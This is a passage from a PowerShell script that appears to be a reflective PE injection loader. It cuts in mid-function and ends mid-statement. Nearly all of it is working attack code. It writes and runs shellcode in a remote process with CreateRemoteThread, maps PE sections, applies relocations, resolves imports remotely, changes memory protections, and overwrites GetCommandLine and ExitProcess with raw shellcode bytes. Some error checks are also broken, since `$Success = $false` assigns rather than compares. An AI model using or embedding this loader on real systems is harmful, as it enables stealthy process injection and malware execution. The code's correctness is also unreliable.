        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }
        
        $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }
        
        #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
        
            #Address to copy the section to
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
            
            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
            #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
            #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
            #    so truncate SizeOfRawData to VirtualSize
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }
            
            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }
            
            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }
        
            #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
        
        #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }
        
        #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            #If SizeOfBlock == 0, we are done
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            #Loop through each relocation
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                #Get info for this relocation
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                #This appears to be true for EXE's as well.
                #   Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {           
                    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
        
                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }               

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }
            
            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                
                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }
                
                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                
                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $ProcedureName = ''
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    #   If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    #   and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([Int64]$OriginalThunkRefVal -lt 0)
                    {
                        $ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                    }
                    
                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
                    }
                    else
                    {
                        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
                    }
                    
                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    
                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )
        
        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }
        
        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
            
            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize
            
            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }
    
    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )
        
        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @() 
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0
        
        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }
        
        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        #   We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
    
        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8
        
        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
        
        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################
        
        
        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        #   I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        #   It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        #   argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
        
        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }
                
                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                
                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                
                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                
                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################
        
        
        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
        
        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr
        
        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr
        
        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            
            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            
            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
            #   call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
